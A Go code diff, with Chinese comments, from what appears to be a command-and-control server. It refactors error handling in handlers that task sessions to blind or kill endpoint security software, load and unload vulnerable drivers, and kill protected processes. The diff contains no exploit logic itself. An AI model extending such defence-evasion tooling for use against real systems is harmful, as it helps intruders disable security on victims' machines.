@@ -60,8 +60,12 @@ func (s *Server) edrBlindHandler(w http.ResponseWriter, r *http.Request) {
 	w.Header().Set("Content-Type", "application/json")
 	vars := mux.Vars(r)
 	id := vars["id"]
-	if s.listener == nil {
-		http.Error(w, `{"error":"Listener not available"}`, http.StatusInternalServerError)
+	// 会话不存在 → 404、listener 未就绪 → 503：别把「客户端 id 写错」报成 5xx 服务端故障
+	// （语义约定见 handlers_session_guard.go）。
+	if !s.requireSessionFromPath(w, r) {
+		return
+	}
+	if !s.requireListener(w) {
 		return
 	}
 	taskInfo, err := s.taskMgr.CreateEDRBlind(id)
@@ -92,8 +96,12 @@ func (s *Server) edrKillHandler(w http.ResponseWriter, r *http.Request) {
 	}
 	_ = json.NewDecoder(r.Body).Decode(&req)
 
-	if s.listener == nil {
-		http.Error(w, `{"error":"Listener not available"}`, http.StatusInternalServerError)
+	// 会话不存在 → 404、listener 未就绪 → 503：别把「客户端 id 写错」报成 5xx 服务端故障
+	// （语义约定见 handlers_session_guard.go）。
+	if !s.requireSessionFromPath(w, r) {
+		return
+	}
+	if !s.requireListener(w) {
 		return
 	}
 	taskInfo, err := s.taskMgr.CreateEDRKill(id, req.Processes)
@@ -173,8 +181,12 @@ func (s *Server) byovdKillHandler(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	if s.listener == nil {
-		http.Error(w, `{"error":"Listener not available"}`, http.StatusInternalServerError)
+	// 会话不存在 → 404、listener 未就绪 → 503：别把「客户端 id 写错」报成 5xx 服务端故障
+	// （语义约定见 handlers_session_guard.go）。
+	if !s.requireSessionFromPath(w, r) {
+		return
+	}
+	if !s.requireListener(w) {
 		return
 	}
 	taskInfo, err := s.taskMgr.CreateBYOVDKill(id, req.PID, req.ProcessName, device, ioctl)
@@ -222,8 +234,12 @@ func (s *Server) byovdLoadHandler(w http.ResponseWriter, r *http.Request) {
 		http.Error(w, `{"error":"driver_b64 is required"}`, http.StatusBadRequest)
 		return
 	}
-	if s.listener == nil {
-		http.Error(w, `{"error":"Listener not available"}`, http.StatusInternalServerError)
+	// 会话不存在 → 404、listener 未就绪 → 503：别把「客户端 id 写错」报成 5xx 服务端故障
+	// （语义约定见 handlers_session_guard.go）。
+	if !s.requireSessionFromPath(w, r) {
+		return
+	}
+	if !s.requireListener(w) {
 		return
 	}
 
@@ -299,8 +315,12 @@ func (s *Server) byovdUnloadHandler(w http.ResponseWriter, r *http.Request) {
 		ServiceName string `json:"service_name"`
 	}
 	_ = json.NewDecoder(r.Body).Decode(&req)
-	if s.listener == nil {
-		http.Error(w, `{"error":"Listener not available"}`, http.StatusInternalServerError)
+	// 会话不存在 → 404、listener 未就绪 → 503：别把「客户端 id 写错」报成 5xx 服务端故障
+	// （语义约定见 handlers_session_guard.go）。
+	if !s.requireSessionFromPath(w, r) {
+		return
+	}
+	if !s.requireListener(w) {
 		return
 	}
 	taskInfo, err := s.taskMgr.CreateBYOVDUnload(id, req.ServiceName)
@@ -328,8 +348,12 @@ func (s *Server) pplKillHandler(w http.ResponseWriter, r *http.Request) {
 		Processes []string `json:"processes"`
 	}
 	_ = json.NewDecoder(r.Body).Decode(&req)
-	if s.listener == nil {
-		http.Error(w, `{"error":"Listener not available"}`, http.StatusInternalServerError)
+	// 会话不存在 → 404、listener 未就绪 → 503：别把「客户端 id 写错」报成 5xx 服务端故障
+	// （语义约定见 handlers_session_guard.go）。
+	if !s.requireSessionFromPath(w, r) {
+		return
+	}
+	if !s.requireListener(w) {
 		return
 	}
 	taskInfo, err := s.taskMgr.CreatePPLKill(id, req.Processes)
